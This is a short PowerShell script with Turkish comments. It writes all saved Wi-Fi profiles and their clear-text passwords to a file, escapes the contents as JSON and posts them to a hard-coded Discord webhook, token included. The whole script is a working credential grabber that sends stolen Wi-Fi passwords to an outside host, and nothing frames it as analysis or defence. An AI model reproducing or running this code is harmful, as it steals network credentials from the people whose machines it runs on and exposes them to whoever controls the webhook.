# 1. Wi-Fi şifrelerini dosyaya yaz
netsh wlan show profile name="*" key=clear > "$env:USERPROFILE\wifipass.txt"

# 2. Dosya içeriğini oku
$filePath = "$env:USERPROFILE\wifipass.txt"
$fileContent = Get-Content $filePath -Raw

# 3. Özel karakterleri JSON için escape et (çift tırnak ve ters eğik çizgi)
$escapedContent = $fileContent -replace '\\', '\\\\' -replace '"', '\"'

# 4. JSON'u elle oluştur
$jsonPayload = "{""content"": ""```$escapedContent```"" }"

# 5. Webhook adresin
$webhookUrl = "https://discord.com/api/webhooks/1397314423084810250/BKCu31_MoFQOrfWi6ZGFGa7CXbGAcnIqeRfZXDXL7IG2Y0kRN6lYT_fxibN-8fIcBfTN"

# 6. Discord'a gönder
Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonPayload -ContentType "application/json"
